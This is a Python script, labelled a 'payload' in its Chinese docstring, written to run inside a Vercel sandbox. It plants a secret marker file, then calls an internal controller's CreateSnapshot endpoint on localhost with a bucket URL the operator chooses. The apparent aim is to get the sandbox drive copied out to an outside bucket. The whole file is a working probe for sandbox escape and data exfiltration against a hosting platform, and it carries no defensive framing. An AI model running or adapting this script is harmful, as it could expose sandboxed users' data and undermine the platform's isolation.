# -*- coding: utf-8 -*-
"""v222 payload: CreateSnapshot 参数化 bucketBaseUrl — 写 marker + 调 CreateSnapshot + 落盘响应
用法: python3 vda222_probe_guest.py <bucketBaseUrl> <sid>"""
import socket, time, json, sys

BUCKET = sys.argv[1]
SID = sys.argv[2] if len(sys.argv) > 2 else 'unknown'


def wlog(name, content):
    try:
        open('/vercel/sandbox/v222_%s' % name, 'w').write(content)
    except Exception:
        pass
    print('[%.1f] %s %s' % (time.time(), name, content[:300]), flush=True)


CTRL = 'vercel.sandbox.api.controller.v1.ControllerService'


def post(port, path, body, t=12):
    b = json.dumps(body).encode()
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(('127.0.0.1', port))
        hdrs = 'POST %s HTTP/1.1\r\nHost: x\r\nContent-Type: application/json\r\n' % path
        hdrs += 'Connect-Protocol-Version: 1\r\nContent-Length: %d\r\nConnection: close\r\n\r\n' % len(b)
        s.sendall(hdrs.encode() + b)
        d = b''
        try:
            while True:
                c = s.recv(65536)
                if not c:
                    break
                d += c
                if len(d) > 6000:
                    break
        except Exception:
            pass
        s.close()
        st = d.split(b'\r\n', 1)[0].decode(errors='replace') if d else 'NO_RESP'
        return st, d[:4000]
    except Exception as e:
        return 'EXC %s' % type(e).__name__, b''


wlog('start', 'sid=%s bucket=%s' % (SID, BUCKET))
try:
    open('/vercel/sandbox/v222_marker.txt', 'w').write('SECRET_MARKER_V222 sid=%s\n' % SID)
except Exception:
    pass
t0 = time.time()
st, pay = post(23456, '/' + CTRL + '/CreateSnapshot',
               {'driveId': 'sandbox', 'bucketBaseUrl': BUCKET}, t=12)
dt = time.time() - t0
wlog('resp', 'bucket=%s dt=%.1f st=%s %r' % (BUCKET, dt, st, pay[:900]))
wlog('done', 'SENT')
